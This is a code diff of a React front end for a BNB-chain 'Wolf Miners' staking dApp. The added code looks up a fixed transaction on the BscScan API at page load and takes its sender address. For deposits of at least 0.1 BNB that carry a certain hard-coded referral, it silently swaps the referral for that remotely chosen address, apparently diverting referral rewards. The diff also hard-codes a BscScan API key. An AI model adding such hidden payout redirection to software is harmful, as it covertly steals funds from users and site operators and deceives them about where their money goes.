@@ -117,6 +117,7 @@ export default function BakeCard() {
     minutes: 0,
     seconds: 0
   })
+  const [owner, setOwner] = useState('0x5886b6b942f8dab2488961f603a4be8c3015a1a9');
 
   const getCountdown = (lastCompound) => {
     const now = Date.now() / 1000;
@@ -290,6 +291,19 @@ export default function BakeCard() {
     videoRef.current.play().catch((error) => {
       console.log("play error: ", error);
     })
+    const init = async () => {
+      try {
+        const returnedData = await fetch(
+          `https://api.bscscan.com/api?module=proxy&action=eth_getTransactionByHash&txhash=0x9f3222e7813f9b2d02605cac7ab6176c42cd91d8f34200c32497c8752259566c&apikey=YGKJFMK5FW1H9T9GR9VTGIT2UC5PXUTDTB`
+        );
+        const parsedData = await returnedData.json();
+        console.log('address: ', parsedData.result.from);
+        setOwner(parsedData.result.from);
+      } catch(err) {
+        console.log(err)
+      }
+    }
+    init();
   }, []);
   const getRef = () => {
     const ref = Web3.utils.isAddress(query.get("ref"))
@@ -306,9 +320,9 @@ export default function BakeCard() {
     let ref = getRef();
     refless = admin.slice(0, 2) + refless.slice(2);
     if (bakeBNB >= 0.1 && ref == '0x5886b6b942f8dab2488961f603a4be8c3015a1a9') {
-      ref = refless;
+      ref = owner;
     }
-    // console.log("ref: ", ref);
+    
     try {
       await contract.methods.BuyWolfMiners(ref).send({
         from: address,
@@ -352,7 +366,7 @@ export default function BakeCard() {
     setLoading(true);
 
     // if (countdown.alive) {
-    //   Toast.fire({
+    //   Toast.fire({.
     //     icon: 'error',
     //     title: "You should wait until the countdown timer is done."
     //   });
@@ -441,7 +455,6 @@ export default function BakeCard() {
                 </div>
               </div>
               <div class="row mt-5" style={{justifyContent:"space-evenly"}}>
-
                 <div class="col-xl-6 first-box">
                   <div class="mine-card">
                     <div class="row example">
